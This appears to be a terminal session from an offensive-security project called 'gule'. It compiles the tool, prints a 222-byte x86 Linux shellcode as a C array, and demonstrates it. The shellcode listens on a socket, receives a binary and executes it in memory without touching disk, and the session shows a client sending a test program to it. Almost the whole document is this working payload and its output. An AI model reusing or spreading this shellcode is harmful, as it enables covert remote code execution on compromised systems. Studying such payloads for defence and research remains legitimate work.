/**
 * Userland exec() shellcode 
 */

genetics@orsini:~/ule/gule-0.1$ make
gcc -g libgule.c gule-client.c -o gule-client
gcc -g gule-shellcode.c -o gule-shellcode
gcc -g -static test.c -o test
genetics@orsini:~/ule/gule-0.1$ ./gule-shellcode 
The gule shellcode
usage: argv[0] [exec]
char shellcode[] = "\x31\xc0\x40\x89\x46\x0c\x89\xc3\x40\x89\x46\x08\x04\x04\x89\x46\x10\x8d\x4e\x08\xb0\x66\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x08\x02\x66\xc7\x46\x0a\x41\x41\x89\x46\x0c\x89\x56\x11\x8d\x4e\x08\x89\x4e\x15\x43\x89\xd9\x80\xc1\x0e\x89\x4e\x19\x8d\x4e\x11\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x31\xc0\x43\x89\x46\x15\x89\x46\x19\xb0\x66\xcd\x80\x89\x46\x18\x8b\x5e\x18\x8d\x0e\x31\xd2\x80\xc2\x08\x31\xc0\x04\x03\xcd\x80\x8b\x4e\x04\x85\xc9\x74\x43\x8b\x1e\x8b\x4e\x04\x31\xc0\x04\x5b\xcd\x80\x31\xc0\x89\x46\x14\x04\x07\x89\x46\x08\x04\x2a\x89\x46\x0c\xc7\x46\x10\xff\xff\xff\xff\x89\xf3\x04\x29\xcd\x80\x8b\x5e\x18\x8b\x0e\x8b\x56\x04\x31\xc0\x04\x03\xcd\x80\x01\x06\x29\x46\x04\x8b\x46\x04\x85\xc0\x75\xe6\xeb\xa6\x8b\x5e\x18\xb9\xb4\xfe\xff\xbf\x31\xd2\x80\xc2\x4f\x31\xc0\x04\x03\xcd\x80\xbc\xb4\xfe\xff\xbf\x8b\x44\x24\x14\x50\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x31\xeb\xc3\x89";
total length: 222
genetics@orsini:~/ule/gule-0.1$ ./gule-shellcode exec &
[1] 1941
The gule shellcode
usage: argv[0] [exec]
genetics@orsini:~/ule/gule-0.1$ ./gule-client test 127.0.0.1 16705
gule
04090000-04091000 -wxs 00000000 00:04 3879       /dev/zero (deleted)
08048000-080af000 rwxs 00000000 00:04 3883       /dev/zero (deleted)
40000000-40016000 r-xp 00000000 03:07 160317     /lib/ld-2.3.2.so
40016000-40017000 rw-p 00015000 03:07 160317     /lib/ld-2.3.2.so
40017000-40019000 rw-p 00000000 00:00 0
40025000-4014d000 r-xp 00000000 03:07 160320     /lib/libc-2.3.2.so
4014d000-40155000 rw-p 00127000 03:07 160320     /lib/libc-2.3.2.so
40155000-40258000 rw-p 00000000 00:00 0
bffff000-c0000000 rwxp 00000000 00:00 0
done ...
[1]+  Exit 14                 ./gule-shellcode exec
genetics@orsini:~/ule/gule-0.1$ 
